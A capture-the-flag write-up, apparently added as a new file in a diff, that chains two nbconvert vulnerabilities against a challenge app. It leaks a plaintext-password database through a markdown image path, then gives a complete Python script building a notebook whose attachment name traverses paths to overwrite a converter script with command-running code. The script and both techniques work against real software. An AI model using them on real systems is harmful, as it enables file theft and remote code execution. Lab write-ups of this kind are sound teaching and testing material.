@@ -1,0 +1,79 @@
+In this challenge, I have to perform source code review and during source code review I came across nbconvert which converts a .ipynb file into .html 
+
+Further enumeration results in discovery of two vulnerabilities associated with this package CVE-2026-39378 and CVE-2026-39377
+
+To solve this challenge, I need to get the admin password to enable asset_storage_enabled using CVE-2026-39378 and then getting the flag using CVE-2026-39377
+
+Step 1 - Get the admin password
+
+I see that the database stores the password in plain text
+app/db.py
+CREATE TABLE users (
+    id INTEGER PRIMARY KEY AUTOINCREMENT,
+    username TEXT UNIQUE NOT NULL,
+    password TEXT NOT NULL,
+    role TEXT NOT NULL CHECK(role IN ('user', 'admin'))
+);
+
+If I can leak the database I can get the admin password, for that I create a notebook file and add a markdown cell
+and add the absolute path of the database ![test](/srv/app/data/app.db) and I send the file and convert it into HTML, in the <img alt="test" src="data:None;base64,U1FMaXRlIGZ…AAAAAAAAAAAAAAAAAAAAAAAAAAAA="> contains the entire database.
+
+Step 2 - Get the flag
+
+I enable the asset_storage_enabled, looking at the source code I find that here, 
+app/services/conversions.py
+try:
+        completed = subprocess.run(
+            [
+                sys.executable,
+                str(CONVERTER_SCRIPT),
+
+and
+
+CONVERTER_SCRIPT = BASE_DIR / "app" / "converter" / "convert_job.py"
+
+So if I can overwrite the content of convert_job.py I can achieve command execution, and I also know that I cannot directly access the flag.txt , I have to execute /readflag file to print the output from /root/flag.txt, I can also copy the content of flag.txt to a static folder.
+
+To achieve this, I created a python script which gives an exploit.ipynb
+
+#!/usr/bin/python3 
+import base64
+import json
+
+def build_hook_payload() -> str:
+    return """
+import os
+os.system("/readflag > /srv/app/app/static/flag.txt")
+""".strip()
+
+def build_hook_notebook(payload: str) -> bytes:
+    target = "../../../../app/converter/convert_job.py"
+    encoded_payload = base64.b64encode(payload.encode("utf-8")).decode("ascii")
+    notebook = {
+        "cells": [
+            {
+                "cell_type": "markdown",
+                "id": "hook-cell",
+                "metadata": {},
+                "source": [f"![hook](attachment:{target})"],
+                "attachments": {
+                    target: {
+                        "text/plain": encoded_payload,
+                    }
+                },
+            }
+        ],
+        "metadata": {},
+        "nbformat": 4,
+        "nbformat_minor": 5,
+    }
+    return json.dumps(notebook).encode("utf-8")
+
+if __name__ == "__main__":
+    payload = build_hook_payload()
+    notebook_bytes = build_hook_notebook(payload)
+    with open("exploit.ipynb", "wb") as f:
+        f.write(notebook_bytes)
+    print("Exploit notebook created: exploit.ipynb")
+
+I submitted the exploit notebook file and converted it into Markdown, and to trigger the payload I submitted another file which failed proving my payload executed , I visited <base_url>/static/flag.txt and there I have my flag.
